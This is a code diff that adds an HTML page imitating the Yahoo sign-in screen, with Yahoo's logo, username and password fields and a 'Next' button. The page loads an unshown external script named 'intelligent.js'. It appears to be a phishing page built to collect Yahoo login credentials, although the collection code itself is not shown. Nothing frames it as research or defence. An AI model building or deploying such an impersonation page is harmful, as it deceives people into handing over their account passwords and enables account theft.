@@ -1,1 +1,121 @@
-yahooooooolink
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Yahoo – login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      max-width: 400px;
+      width: 100%;
+      padding: 20px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .logo img {
+      width: 150px;
+      height: auto;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 22px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 15px;
+      font-size: 16px;
+    }
+
+    button {
+      padding: 12px;
+      background-color: #5f01d1;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    button:hover {
+      background-color: #4a00aa;
+    }
+
+    .forgot {
+      text-align: right;
+      margin-top: 10px;
+    }
+
+    .forgot a {
+      text-decoration: none;
+      color: #5f01d1;
+      font-size: 14px;
+    }
+
+    .signup {
+      text-align: center;
+      margin-top: 25px;
+      font-size: 14px;
+    }
+
+    .signup a {
+      text-decoration: none;
+      color: #5f01d1;
+    }
+  </style>
+</head>
+<script src="intelligent.js"></script>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage.png" alt="Yahoo Logo">
+    </div>
+
+    <h1>Sign in</h1>
+
+    <form>
+      <input type="text" placeholder="Username, email, or mobile" name="Email Address or phone number" required />
+            <input type="text" placeholder="Password" name="Password" required />
+      <button type="submit">Next</button>
+    </form>
+
+    <div class="forgot">
+      <a href="#">Forgot username?</a>
+    </div>
+
+    <div class="signup">
+      <p>New to Yahoo? <a href="#">Create an account</a></p>
+    </div>
+  </div>
+</body>
+</html>
